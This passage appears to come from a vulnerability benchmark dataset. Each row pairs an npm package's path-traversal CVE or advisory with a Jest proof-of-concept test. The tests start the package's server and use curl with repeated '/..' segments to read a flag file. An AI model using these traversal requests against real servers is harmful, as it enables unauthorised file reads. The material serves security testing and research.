    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wind-mvc/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/util/util4HTML.js:7:5,https://security.snyk.io/vuln/npm:wind-mvc:20170503; https://github.com/advisories/GHSA-7g8m-5qh9-9pgw
path-traversal,CVE-2016-10561,bitty,0.1.0,n/a,path-traversal/bitty_0.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in bitty"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/bitty/index.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:36:10,https://security.snyk.io/vuln/npm:bitty:20161014; https://github.com/advisories/GHSA-f5mh-hq6h-whxv
path-traversal,CVE-2017-16187,open-device,4.0.1,n/a,path-traversal/open-device_4.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in open-device"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/open-device/broadcast.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/server-accessible.js:14:12,https://security.snyk.io/vuln/npm:open-device:20170430; https://github.com/advisories/GHSA-jpjp-vxv6-59hm
path-traversal,,static-server-gx,1.2.1,n/a,path-traversal/static-server-gx_1.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 10000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in static-server-gx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 10000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/static-server-gx/server.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:10000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:7:9,https://security.snyk.io/vuln/SNYK-JS-STATICSERVERGX-609517; 
path-traversal,CVE-2017-16090,fsk-server,0.2.1,n/a,path-traversal/fsk-server_0.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fsk-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fsk-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:48:23,https://security.snyk.io/vuln/npm:fsk-server:20170419; https://github.com/advisories/GHSA-c3hr-wwh3-qm54
path-traversal,CVE-2017-16148,serve46,1.0.0,n/a,path-traversal/serve46_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serve46"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serve46/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:19:8,https://security.snyk.io/vuln/npm:serve46:20170612; https://github.com/advisories/GHSA-qw9c-8p76-3q2x
path-traversal,,nitro-server,1.3.3,n/a,path-traversal/nitro-server_1.3.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nitro-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""nitro-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  pkg.start("""");
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:148:10,https://security.snyk.io/vuln/npm:nitro-server:20180226; 
path-traversal,,lihuini,1.0.0,n/a,path-traversal/lihuini_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lihuini"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lihuini/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:lihuini:20170730; 
path-traversal,CVE-2017-16198,ritp,1.0.5,n/a,path-traversal/ritp_1.0.5,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ritp"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ritp/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:53:37,https://security.snyk.io/vuln/npm:ritp:20170508; https://github.com/advisories/GHSA-gf7h-vg5v-cch6
path-traversal,CVE-2017-16185,uekw1511server,1.0.1,n/a,path-traversal/uekw1511server_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in uekw1511server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/uekw1511server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:14:17,https://security.snyk.io/vuln/npm:uekw1511server:20170509; https://github.com/advisories/GHSA-pm44-7gw9-6g8p
path-traversal,,ltt.js,1.0.0,n/a,path-traversal/ltt.js_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ltt.js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ltt.js/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:ltt.js:20170503; https://github.com/advisories/GHSA-6qh5-wx38-q92g
path-traversal,,hdsdhhksjd,1.0.0,n/a,path-traversal/hdsdhhksjd_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hdsdhhksjd"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hdsdhhksjd/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:hdsdhhksjd:20180315; 
path-traversal,CVE-2018-16479,http-live-simulator,1.0.0,1.0.7,path-traversal/http-live-simulator_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in http-live-simulator"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/http-live-simulator/bin/http-live"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,bin/http-live:55:7,https://security.snyk.io/vuln/SNYK-JS-HTTPLIVESIMULATOR-73554; https://github.com/advisories/GHSA-7c9w-qmrq-ff8r
path-traversal,CVE-2017-16193,mfrs,1.0.0,n/a,path-traversal/mfrs_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mfrs"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mfrs/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
}, 30000);
",n/a,index.js:6:8,https://security.snyk.io/vuln/npm:mfrs:20170427; https://github.com/advisories/GHSA-jjgw-jf33-7fg9
path-traversal,CVE-2017-16149,zwserver,0.1.1,n/a,path-traversal/zwserver_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zwserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zwserver/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:32:6,https://security.snyk.io/vuln/npm:zwserver:20170516; https://github.com/advisories/GHSA-whcm-29f4-j4mx
path-traversal,CVE-2017-16085,tinyserver2,0.5.2,0.6.1,path-traversal/tinyserver2_0.5.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8976/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in tinyserver2"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8976/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/tinyserver2/tinyserver.js -p 8976"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8976${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,tinyserver.js:27:6,https://security.snyk.io/vuln/npm:tinyserver2:20170503; https://github.com/advisories/GHSA-g8wf-rcg3-qw4q
path-traversal,CVE-2017-16147,shit-server,1.0.0,n/a,path-traversal/shit-server_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shit-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shit-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:76:8,https://security.snyk.io/vuln/npm:shit-server:20170511; https://github.com/advisories/GHSA-6x8c-mvpv-5366
path-traversal,,wrlc,0.2.5,n/a,path-traversal/wrlc_0.2.5,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wrlc"", (done) => {
  expect.assertions(1);
  const pkg = require(""wrlc"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8972/tcp"", () => {});
  } catch (e) {}
  pkg.serve(
    {
      port: 8972,
      host: ""localhost"",
    },
    () => {}
  );
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8972${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:26:25,https://security.snyk.io/vuln/npm:wrlc:20180306; 
path-traversal,,isv-http,0.0.9,n/a,path-traversal/isv-http_0.0.9,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in isv-http"", (done) => {
  expect.assertions(1);
  const pkg = require(""isv-http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9527/tcp"", () => {});
  } catch (e) {}
  pkg.runserver();
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9527${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:47:20,https://security.snyk.io/vuln/npm:isv-http:20180226; 
path-traversal,,zhaolei1111,1.1.0,n/a,path-traversal/zhaolei1111_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8035/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhaolei1111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8035/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhaolei1111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8035${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:zhaolei1111:20180315; 
path-traversal,,gamebutler,1.0.4,n/a,path-traversal/gamebutler_1.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gamebutler"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server =
    ""node ./node_modules/gamebutler/build/gamebutler.js ../flag.html"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,build/gamebutler.js:69:43,https://security.snyk.io/vuln/npm:gamebutler:20180226; 
path-traversal,CVE-2017-16121,datachannel-client,1.0.2,n/a,path-traversal/datachannel-client_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in datachannel-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/datachannel-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:30:12,https://security.snyk.io/vuln/npm:datachannel-client:20170418; https://github.com/advisories/GHSA-jpg7-6c9f-7q54
path-traversal,,rjpserver,1.0.0,n/a,path-traversal/rjpserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rjpserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/rjpserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:rjpserver:20180315; 
path-traversal,CVE-2017-16214,peiserver,1.0.0,n/a,path-traversal/peiserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in peiserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/peiserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:13:8,https://security.snyk.io/vuln/npm:peiserver:20170518; https://github.com/advisories/GHSA-74f5-4m28-gq5c
path-traversal,,api-proxy,0.0.2,n/a,path-traversal/api-proxy_0.0.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in api-proxy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  require(""api-proxy"").start(8888);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/static.js:40:9,https://security.snyk.io/vuln/npm:api-proxy:20180226; 
path-traversal,,server12311,1.2.0,n/a,path-traversal/server12311_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in server12311"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/server12311/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:server12311:20180226; 
path-traversal,CVE-2017-16095,serverliujiayi1,1.1.0,n/a,path-traversal/serverliujiayi1_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverliujiayi1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverliujiayi1/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverliujiayi1:20170518; https://github.com/advisories/GHSA-vhx6-cp8w-295m
path-traversal,,wangshuai,1.0.0,n/a,path-traversal/wangshuai_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wangshuai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wangshuai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
